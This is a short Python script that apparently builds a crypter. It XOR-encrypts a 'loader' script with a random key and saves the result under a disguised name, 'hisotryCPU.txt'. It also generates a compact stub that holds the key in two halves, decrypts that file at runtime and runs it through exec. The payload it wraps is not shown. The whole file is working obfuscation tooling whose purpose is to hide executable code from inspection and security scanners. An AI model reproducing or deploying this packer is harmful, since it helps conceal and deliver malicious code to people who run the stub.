import os
import secrets

LOADER_SRC = "yp.py" # the loader 
LOADER_ENC = "hisotryCPU.txt" # outfilr - loader
STUB_OUT = "py.py" # stub file

def xor_bytes(data: bytes, key: bytes) -> bytes:
    return bytes(data[i] ^ key[i % len(key)] for i in range(len(data)))


XOR_KEY = secrets.token_bytes(16)
XOR_KEY_HEX = XOR_KEY.hex()

with open(LOADER_SRC, "rb") as f:
    src = f.read()

enc = xor_bytes(src, XOR_KEY)

with open(LOADER_ENC, "wb") as f:
    f.write(enc)

print(f"[+] Encrypted loader  : {LOADER_ENC} ({len(enc)} bytes)")
print(f"[+] XOR key (hex)     : {XOR_KEY_HEX}")


half  = len(XOR_KEY_HEX) // 2
key_a = XOR_KEY_HEX[:half]
key_b = XOR_KEY_HEX[half:]


stub_code = f'''import os,sys
_d=os.path.dirname(os.path.abspath(sys.argv[0]))
_p=os.path.join(_d,"{LOADER_ENC}")
_k=bytes.fromhex("{key_a}""{key_b}")
with open(_p,"rb") as _f:_e=_f.read()
_c=bytes(_e[i]^_k[i%len(_k)]for i in range(len(_e)))
_ns={{}}
exec(compile(_c,"{LOADER_SRC}","exec"),_ns)
_ns["main"]()
'''

with open(STUB_OUT, "w") as f:
    f.write(stub_code)

print(f"[+] Stub generated    : {STUB_OUT}")


